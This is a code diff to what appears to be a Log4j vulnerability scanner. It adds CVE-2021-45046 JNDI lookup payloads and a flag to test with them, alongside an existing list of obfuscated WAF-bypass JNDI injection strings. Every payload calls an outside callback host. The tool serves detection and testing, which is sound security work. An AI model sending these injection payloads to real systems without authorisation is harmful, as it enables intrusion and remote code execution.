@@ -57,7 +57,15 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+                       "${jndi:dns://{{callback_host}}}",
+                       ]
+
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
+                 ]  
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -99,6 +107,10 @@ parser.add_argument("--wait-time",
 parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
+                    action='store_true')
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                     action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
@@ -147,6 +159,14 @@ def get_fuzzing_post_data(payload):
 def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
     for i in waf_bypass_payloads:
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+def get_cve_2021_45046_payloads(callback_host, random_string):
+    payloads = []
+    for i in cve_2021_45046:
         new_payload = i.replace("{{callback_host}}", callback_host)
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
@@ -265,6 +285,10 @@ def scan_url(url, callback_host):
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    if args.cve_2021_45046:
+        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
+        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
